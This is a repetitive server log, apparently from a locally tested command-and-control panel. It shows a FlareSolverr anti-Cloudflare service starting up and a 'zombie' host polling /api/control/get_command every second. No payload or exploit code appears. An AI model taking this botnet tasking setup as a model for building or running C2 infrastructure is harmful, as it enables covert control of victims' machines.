2025-06-25 00:30:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:30:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:30:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:30:09 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:30:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:30:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:30:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:30:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:30:10 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:30:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:30:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:30:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:30:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:30:11 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:30:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0019s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:30:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:30:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:23:51 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 11:23:51 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 11:23:51 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 11:23:51 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 11:23:51 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 11:23:51 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 11:23:51 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 11:23:51 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 11:23:51 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-25 11:23:55 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-25 11:23:55 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-25 11:23:55 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 11:23:55 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 11:23:55 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 11:23:55 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 11:23:55 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 11:23:55 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 11:23:55 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 11:23:55 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 11:23:55 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 11:23:55 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 11:23:55 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-25 11:23:55 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 11:23:55 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 11:23:55 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-25 11:23:55 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-25 11:23:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:23:56 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:23:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0226s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:23:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:23:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:23:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:23:57 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:23:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:23:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:23:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:23:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:23:58 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:23:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:23:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:23:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:23:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:23:59 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:23:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:23:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:23:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:01 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:02 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:04 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:06 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:07 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:09 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:10 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:11 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:12 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0018s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:13 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:14 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:15 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:16 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:17 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:18 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:19 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:21 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:22 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:23 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:24 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:25 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:26 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:27 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:29 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:30 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:31 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:32 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:34 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:35 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:36 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:37 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:39 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0019s) -> 回傳: <Response 41 bytes [200 OK]>
